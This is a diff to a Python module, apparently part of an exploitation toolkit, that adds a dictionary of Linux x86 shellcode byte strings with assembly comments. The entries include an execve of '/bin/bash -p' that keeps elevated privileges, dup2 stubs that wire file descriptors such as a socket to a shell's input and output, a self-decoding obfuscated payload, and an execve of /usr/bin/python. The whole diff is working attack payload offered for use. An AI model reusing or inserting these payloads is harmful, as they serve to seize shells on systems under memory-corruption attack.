@@ -13,6 +13,83 @@ import httplib
 from utils import msg, error_msg
 
 shellcode_x86_linux = {
+    # execve("/bin/bash", ["/bin/bash", "-p"], NULL)    
+    "bash": (
+        "\x6a\x0b"                  # push   $0xb
+        "\x58"                      # pop    %eax
+        "\x99"                      # cltd   
+        "\x52"                      # push   %edx
+        "\x66\x68\x2d\x70"          # pushw  $0x702d
+        "\x89\xe1"                  # mov    %esp,%ecx
+        "\x52"                      # push   %edx
+        "\x6a\x68"                	# push   $0x68
+        "\x68\x2f\x62\x61\x73"      # push   $0x7361622f
+        "\x68\x2f\x62\x69\x6e"      # push   $0x6e69622f
+        "\x89\xe3"                	# mov    %esp,%ebx
+        "\x52"                   	# push   %edx
+        "\x51"                   	# push   %ecx
+        "\x53"                   	# push   %ebx
+        "\x89\xe1"                	# mov    %esp,%ecx
+        "\xcd\x80"                	# int    $0x80; 
+    ),
+    # dup2(4, 0) read: >&4
+    "dup2_4_0": (
+        "\x6a\x04"                  # 0x00000000:    push byte +0x4  ; oldfd
+        "\x5b"                      # 0x00000002:    pop ebx
+        "\x31\xc9"                  # 0x00000003:    xor ecx,ecx     ; newfd
+        "\x6a\x3f"                  # 0x00000005:    push byte +0x3f ; dup2(4,0)
+        "\x58"                      # 0x00000007:    pop eax
+        "\xcd\x80"                  # 0x00000008:    int 0x80
+    ),
+    # dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */    
+    "dup2_0_0_1_2": (
+        "\x31\xc9"               	# xor    %ecx,%ecx 
+        #"\x6a\x04"                 # push byte +0x4 ; oldfd
+        "\x56"                   	# push   %esi
+        "\x5b"                   	# pop    %ebx
+        "\x6a\x3f"               	# push   $0x3f ; loop:
+        "\x58"                   	# pop    %eax
+        "\xcd\x80"               	# int    $0x80
+        "\x41"                   	# inc    %ecx
+        "\x80\xf9\x03"           	# cmp    $0x3,%cl
+        "\x75\xf5"               	# jne    80483e8 <loop>
+    ),
+    # dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */    
+    "dup2_4_0_1_2": (
+        "\x6a\x04"                  # push byte +0x4 ; oldfd
+        "\x59"               	    # pop    %ecx 
+        "\x31\xc0"                  # xor    %eax,%eax
+        "\x56"                   	# push   %esi
+        "\x5b"                   	# pop    %ebx
+        "\x6a\x3f"               	# push   $0x3f ; loop:
+        "\x58"                   	# pop    %eax
+        "\xcd\x80"               	# int    $0x80
+        "\x41"                   	# inc    %ecx
+        "\x80\xf9\x03"           	# cmp    $0x3,%cl
+        "\x75\xf5"               	# jne    80483e8 <loop>
+    ),
+    "polimorphism_shellcode": (
+        "\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
+        "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
+        "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+        "\x32\xc1\x51\x69\x30\x30\x74\x69"
+        "\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
+        "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+    ),    
+    "usr_bin_python":(
+        "\x31\xc0"               # 0x00000000:     xor eax,eax
+        "\x50"                   # 0x00000002:     push eax
+        "\x68\x74\x68\x6f\x6e"   # 0x00000003:     push dword 0x6e6f6874 ; thon
+        "\x68\x2f\x2f\x70\x79"   # 0x00000003:     push dword 0x79702f2f ; //py
+        "\x68\x2f\x62\x69\x6e"   # 0x00000003:     push dword 0x6e69622f ; /bin
+        "\x68\x2f\x75\x73\x72"   # 0x00000003:     push dword 0x7273752f ; /usr
+        "\x89\xe3"               # 0x0000000D:     mov ebx,esp 
+        "\x31\xc9"               # 0x0000000F:     xor ecx,ecx  
+        "\x89\xca"               # 0x00000011:     mov edx,ecx
+        "\x6a\x0b"               # 0x00000013:     push byte +0xb 
+        "\x58"                   # 0x00000015:     pop eax
+        "\xcd\x80"               # 0x00000016:     int 0x80 ; execve()
+    ),
     "exec": (
         "\x31\xc0"               # 0x00000000:     xor eax,eax
         "\x50"                   # 0x00000002:     push eax
